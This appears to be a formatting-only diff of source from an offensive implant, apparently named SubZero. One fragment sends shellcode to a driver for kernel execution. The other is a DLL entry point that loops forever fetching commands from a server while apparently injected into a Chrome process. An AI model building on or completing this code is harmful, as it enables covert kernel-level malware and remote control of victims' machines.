@@ -56,11 +56,11 @@ void InjectKernelShellcode_OpcodeHandler(const PVOID Data, const size_t DataLeng
 
     DWORD bytesReturned = 0;
     if (!::DeviceIoControl(
-        deviceAutoHandle.get(),								                        // device to be queried
-        IOCTL_SUBZERO_EXECUTE_SHELLCODE,						                    // operation to perform
+        deviceAutoHandle.get(),								                // device to be queried
+        IOCTL_SUBZERO_EXECUTE_SHELLCODE,						            // operation to perform
         inputBuffer.get(), bufferSize,							            // input buffer
         outputBuffer.get(), shellcodeDataStruct->ReturnedDataMaxSize,	   	// output buffer
-        &bytesReturned,                  											// # bytes returned
+        &bytesReturned,                  									// # bytes returned
         nullptr))
         throw std::runtime_error(DEBUG_TEXT("[-] DeviceIoControl Failed"));
 
@@ -96,7 +96,8 @@ BOOL APIENTRY DllMain( HMODULE, DWORD ul_reason_for_call, LPVOID)
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-	    try {
+	    try 
+        {
             // Endless loop, preventing from the APC queue to empty and launch a Chrome window
             while (true) {
                 if (httplib::Error::Success != httpClient->FetchFromServer()) {
